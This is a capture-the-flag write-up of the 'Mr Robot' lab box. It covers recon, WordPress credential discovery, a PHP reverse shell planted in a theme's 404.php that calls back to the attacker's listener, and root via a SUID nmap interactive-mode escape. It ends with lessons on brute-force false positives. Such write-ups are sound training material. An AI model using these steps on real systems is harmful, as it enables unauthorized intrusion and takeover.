# Mr Robot — TryHackMe / VulnHub

**OS:** Linux  ·  **Difficulty:** Medium  ·  **Keys:** 3/3

WordPress foothold via credential discovery, reverse shell as `daemon`, and
root via an outdated SUID `nmap` binary.

> All flags, passwords and tokens below are redacted. IP is shown as `$IP`
> (export your own target IP).

---

## 1. Recon

```
nmap -sC -sV -p- $IP
```

Open ports:

| Port | Service |
|------|---------|
| 22   | SSH     |
| 80   | HTTP    |
| 443  | HTTPS   |

Web server is WordPress — source reveals the version:

```html
<!-- generator="WordPress/4.3.1" -->
```

## 2. Web enumeration

```
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

Key findings:

- `/robots.txt` (41 bytes) — **read every byte of small files**:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

- `key-1-of-3.txt` → **key 1** (redacted)
- `fsocity.dic` → a wordlist. This is the whole game for the login phase.

```
wget http://$IP/fsocity.dic
sort -u fsocity.dic > fsocity_clear.txt
```

### Rabbit holes (avoided / learned)

- `page1` fsociety "command box" (`/prepare /fsociety /join …`) → decorative, not a vector.
- Email "join" form → decorative.
- `sqlmap` against every directory → Mr Robot is **not** a SQLi box.

## 3. WordPress login

WordPress 4.3.1 leaks valid usernames through its login error message:

- Invalid user → `Invalid username`
- Valid user → `The password you entered for the username X is incorrect.`

**User:** `Elliot`
**Password:** `ER28-0652` (redacted)

> Note: both the username and password **do** exist in `fsocity.dic`, but the
> file is not a clean password list — it is a TV-show web page split into words,
> full of HTML/wiki junk (`20Elliot`, `comwikiElliot`, `ElliotTherapy`, …). A
> proper brute-force with the right user (`Elliot`) at a sane thread count would
> have found them — mine failed for a different reason. See *Lessons Learned*.

Login at `/wp-login.php` → `/wp-admin`.

## 4. Foothold — reverse shell as `daemon`

From `wp-admin` → **Appearance → Editor** → edit the `twentyfifteen` theme's
`404.php`. Paste a PHP reverse shell (`/usr/share/webshells/php/php-reverse-shell.php`),
editing **only** the `$ip` (your `tun0`) and `$port`:

```php
$ip   = 'YOUR_TUN0_IP';
$port = 4444;
```

Listener:

```
nc -lvnp 4444
```

Trigger the 404 page in the browser → shell lands:

```
id
# uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Upgrade to a proper TTY:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## 5. Privilege escalation — outdated SUID nmap

```
find / -perm -4000 -type f 2>/dev/null
```

Among the standard SUID binaries, one is out of place:

```
/usr/local/bin/nmap
```

A SUID `nmap` in `/usr/local/bin` is not normal — that is the intended vector.
This build is **nmap 3.81**, old enough to still have interactive mode (removed
in later versions, which is why GTFOBins' current `nmap` entry does not list it):

```
nmap --interactive
nmap> !sh
# id → uid=0(root)
```

Confirm:

```
whoami   # root
id       # uid=0(root) gid=0(root) groups=0(root),1(daemon)
```

## 6. Keys

```
cat /home/robot/key-2-of-3.txt   # key 2 (redacted)
cat /root/key-3-of-3.txt         # key 3 (redacted)
```

> **Honest note:** the *intended* chain was daemon → `robot` → root, cracking
> `robot`'s MD5 hash (`/home/robot/password.raw-md5`) and `su robot` to read
> key 2. I skipped that step — root from the SUID nmap let me read key 2
> directly. Valid shortcut, but the MD5-crack step was **not** performed.

---

## Lessons Learned / Takıldığım Yerler

**1. Brute-force under throttling produces fake hits.**
`hydra` kept reporting random "valid" logins (`25T10`, `2595`, hex strings)
with my dummy password. Cause: the target throttled connections
(`all children were disabled due too many connection errors`); an empty/errored
response does not contain the fail-string, so hydra reads "fail-string absent =
success". **A hit where my own made-up constant password is 'correct', or that
appears while connection errors scroll by, is fake — regardless of whether I
know the box.** Verify every hit: did I invent this password? Does this username
look like a human name? Are there connection errors on screen?

**2. The creds were in the wordlist — the *tool* failed, not the list.**
Both `Elliot` and `ER28-0652` are in `fsocity.dic`, so a working brute-force
would have found them. I wasted hours assuming otherwise. The real culprit was
hydra producing fake hits under throttling (see #1), so it never reached the
real line. Also, `fsocity.dic` is not a clean password list but a web page
split into words (HTML/wiki junk), which makes blind brute-force noisy. Lesson:
when brute-force isn't landing, suspect the **tool's behaviour and the list's
nature** before concluding "the password isn't here."

**3. Put a time budget on a tool.**
I locked onto hydra/wpscan for ~4 hours. The fix is not "give up faster" — the
vector was real — but *"if a tool yields nothing in 10–15 min, change the tool
or method, not the target."*

**4. PHP reverse shell: do not break the `$shell` line.**
I replaced `$shell = 'uname -a; w; id; /bin/sh -i';` with an unquoted bash
one-liner → PHP parse error → the page did nothing. Leave `$shell` as-is; only
edit `$ip` and `$port`.

**5. Read the SUID list; don't brute GTFOBins blindly.**
I tried every GTFOBins SUID template in order (including `sudo`, `ssh-keygen`,
`gcc` — binaries that weren't even the anomaly) before noticing `nmap`. The
right reflex: scan the SUID list for the binary that *doesn't belong* on a
normal system (`mount/su/passwd` = noise; `nmap` = the vector).

**6. GTFOBins assumes the current version.**
The `nmap --interactive` / `!sh` escape isn't in GTFOBins' modern entry because
it's version-specific (nmap 3.81). **Check the binary's version** — old builds
have escapes modern pages omit.
